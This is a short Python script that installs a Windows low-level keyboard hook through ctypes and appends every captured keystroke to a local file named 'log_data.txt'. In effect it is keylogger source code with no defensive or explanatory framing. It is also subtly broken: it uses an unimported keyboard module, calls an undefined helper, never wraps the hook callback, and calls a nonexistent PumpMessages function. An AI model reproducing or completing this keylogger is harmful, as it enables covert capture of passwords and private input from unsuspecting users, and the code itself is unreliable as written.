import sys
import os
from ctypes import *

def on_press(key):
    try:
        with open("log_data.txt", "a") as f:
            if key.char is not None:
                f.write(key.char)
                print(f'Alphanumeric: {key.char}')
            else:
                special_key = format_special_key(key)
                f.write(special_key)
                print(f'Special Key: {special_key}')
    except Exception as ex:
        print(f'Error: {ex}')

WM_KEYDOWN = 0x0100
user32 = windll.user32
keyboard_hook = None

def low_level_keyboard_proc(nCode, wParam, lParam):
    if nCode >= 0 and wParam == WM_KEYDOWN:
        key_event = cast(lParam, POINTER(c_ulong)).contents.value
        on_press(keyboard.Key.from_vk(key_event))
    return user32.CallNextHookEx(keyboard_hook, nCode, wParam, lParam)

keyboard_hook = user32.SetWindowsHookExA(13, low_level_keyboard_proc, None, 0)
user32.PumpMessages()